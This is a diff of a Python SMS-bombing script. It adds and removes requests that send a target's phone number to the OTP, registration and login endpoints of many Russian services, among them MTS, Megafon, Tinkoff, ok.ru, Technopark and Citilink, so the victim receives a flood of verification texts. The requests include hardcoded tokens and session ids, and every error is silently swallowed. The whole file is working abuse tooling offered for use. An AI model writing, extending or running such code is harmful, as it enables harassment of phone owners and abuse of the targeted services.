@@ -42,6 +42,10 @@ try:
 					    data={'phone': phone}, headers=headers, timeout=5.05)
 				except:pass
 				try:
+					requests.get('https://www.askona.ru/api/registration/sendcode?csrf_token=214a57c11e2703c3e6745989f1031bc5&contact[phone]='+phone, headers=headers)
+				except:
+					pass
+				try:
 					requests.post('https://www.technopark.ru/graphql/', json={"operationName":"AuthStepOne","variables":{"phone":no7,"token":"9ea9pcg7td0muk9piuhqhhqp26","cityId":"36966"},"query":"mutation AuthStepOne($phone: String!, $token: String!, $cityId: ID!) @access(token: $token) @city(id: $cityId) {\n  sendOTP(phone: $phone)\n}\n"}, headers=headers)
 				except:
 					pass
@@ -63,7 +67,12 @@ try:
 						'grant_type': 'password'}, headers=headers)
 				except:
 					pass
-
+				try:
+					requests.post(
+						'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
+						params={'msisdn': phone}, headers=headers)
+				except:
+					pass
 				try:requests.post("https://login.mts.ru/amserver/UI/Login?service=login&srcsvc=sitemts&goto=https://moskva.mts.ru/json/auth/publicuser/afterlogin",
 					    json= {
 						"login": masska3,
@@ -76,25 +85,23 @@ try:
 					    }, headers=headers, timeout=5.05)
 				except:pass
 
-
+				try:
+					requests.post('https://kokao.revoup.ru/v2/auth', json={'mobile_phone': phone}, headers=headers)
+				except:
+					pass
+				try:
+					requests.post('https://disk.megafon.ru/api/3/md_otp_tokens/', json={"phone": '+' + phone}, headers=headers)
+				except:
+					pass
+				try:
+					requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone,anonymRegistrationEnterPhone', data={"st.r.phone":"+"+phone}, headers=headers)
+				except:
+					pass
 
 				try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
-						data={"phone": pulse}, headers=headers, timeout=5.05)
+						data={"phone": pulse}, headers=headers)
 				except:pass
 				try:requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers)
-				except:pass
-				try:requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode", json={"reqId": "91101-1606335718", "params": {"phone": phone, "language": "ru-RU", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers)
-				except:pass
-				try: requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
-					"msisdn": phone,
-					"locale": "en",
-					"countryCode": "ru",
-					"version": "1",
-					"k": "ic1rtwz1s1Hj1O0r",
-					"r": "46763"
-				    }, headers=headers)
-				except:pass
-				try:requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code", json={"phone_number": phone}, headers=headers)
 				except:pass
 				try:requests.post("https://my.modulbank.ru/api/v2/auth/phone", data={"CellPhone": phone[1:]}, headers=headers)
 				except:pass
